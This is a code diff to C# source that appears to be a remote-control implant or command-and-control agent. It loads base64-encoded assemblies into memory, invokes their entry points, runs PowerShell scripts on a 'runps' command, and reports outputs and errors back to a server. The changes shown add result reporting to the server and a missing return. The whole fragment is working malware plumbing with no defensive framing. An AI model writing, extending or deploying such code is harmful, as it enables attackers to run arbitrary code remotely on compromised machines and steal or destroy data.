@@ -14,6 +14,7 @@ void assemblyload(string payload, string nametosaveitas) {
         byte[] bytearray = Convert.FromBase64String(payload);
         Assembly asm = Assembly.Load(bytearray);
         loadedasms.Add(nametosaveitas, asm);
+        sendmessagetoserver(nametosaveitas + " loaded");
     } catch (Exception e) {
         sendmessagetoserver(e.ToString());
     }
@@ -31,7 +32,12 @@ void assemblyrun(string name) {
             sendmessagetoserver("Was unable to find entrypoint");
             return;
         }
-        method.Invoke(null, new object[] {new string[] { } });
+        var returnvalue = method.Invoke(null, new object[] {new string[] { } });
+        #pragma warning disable 8602
+        #pragma warning disable 8604
+        sendmessagetoserver(returnvalue.ToString()); //can be null, if so just let expection handler tell the user
+        #pragma warning restore 8604
+        #pragma warning restore 8602
     } catch (Exception e) {
         sendmessagetoserver(e.ToString());
     }
@@ -83,6 +89,7 @@ bool handlecommands(string command) {
     }
     if (splits[0] == "runps") {
         runpowershellscript(splits);
+        return true;
     }
 
     return false;
